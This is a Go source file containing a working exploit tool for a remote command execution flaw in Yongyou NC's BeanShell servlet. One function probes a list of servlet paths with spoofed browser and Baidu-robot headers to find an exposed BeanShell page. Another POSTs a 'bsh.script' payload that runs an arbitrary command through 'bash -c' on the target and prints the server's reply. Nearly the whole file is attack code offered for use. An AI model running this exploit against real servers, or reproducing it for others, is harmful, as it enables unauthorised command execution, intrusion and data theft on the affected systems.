package main

import (
	"bytes"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"

	"golang.org/x/net/html"
)

//go:embed bshservlet.txt
var vulPathString string

var Payloads [][2]string
var Cache = make(map[string]string)
var Details = make(map[string]string)
var Detectors = make(map[string]func(string, map[string]string) (bool, error))
var Exploitations = make(map[string]func(string, string, map[string]string) error)
var DefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
var UserAgent = ""

func RemoveEmpty(lst []string) []string {
	var ret []string
	for _, s := range lst {
		if s != "" {
			ret = append(ret, s)
		}
	}
	return ret
}

func DetectorYongyouNC(target string, _ map[string]string) (bool, error) {

	vulPaths := strings.Split(vulPathString, "\n")

	vulPaths = RemoveEmpty(vulPaths)
	for _, path := range vulPaths {
		url0 := target + path
		url1, err := url.Parse(url0)
		if err != nil {
			return false, err
		}

		req := http.Request{
			Method: "GET",
			URL:    url1,
			Header: http.Header{
				"User-Agent": []string{UserAgent},
				"Referer":    []string{"https://www.baidu.com/robot"},
				"Connection": []string{"close"},
			},
		}
		rsp, err := http.DefaultClient.Do(&req)
		if err != nil {
			return false, err
		}
		//goland:noinspection GoUnhandledErrorResult
		defer rsp.Body.Close()
		content, err := io.ReadAll(rsp.Body)
		if err != nil {
			return false, err
		}
		text := string(content)
		if strings.Contains(text, "BeanShell") && rsp.StatusCode == 200 {
			Cache["yongyou_nc_rce_beanshell_path"] = url0
			return true, nil
		}
	}
	return false, nil
}

func ExploitYongyouNC(target, cmd string, options map[string]string) error {
	beanshellPath, ok := options["beanshell_path"]
	if !ok {
		beanshellPath, ok = Cache["yongyou_nc_rce_beanshell_path"]
	}
	if !ok {
		// Target URL is already saved to cache
		vulnerable, err := DetectorYongyouNC(target, options)
		if err != nil {
			return err
		}
		if !vulnerable {
			return errors.New("seems not vulnerable")
		}
	}
	url0 := beanshellPath
	url1, err := url.Parse(url0)
	if err != nil {
		return err
	}
	bsh := html.EscapeString(fmt.Sprintf("exec(\"bash -c '%s'\")", cmd))
	payload := fmt.Sprintf("bsh.script=" + bsh)
	req := http.Request{
		Method: "POST",
		URL:    url1,
		Header: http.Header{
			"User-Agent": []string{UserAgent},
			"Referer":    []string{"https://www.baidu.com/robot"},
			"Connection": []string{"close"},
		},
		Body: ioutil.NopCloser(bytes.NewBufferString(payload)),
	}
	rsp, err := http.DefaultClient.Do(&req)
	if err != nil {
		return err
	}
	content, err := io.ReadAll(rsp.Body)
	if err != nil {
		return err
	}
	fmt.Println(target, rsp.Status)
	fmt.Println(target, string(content))
	return nil
}
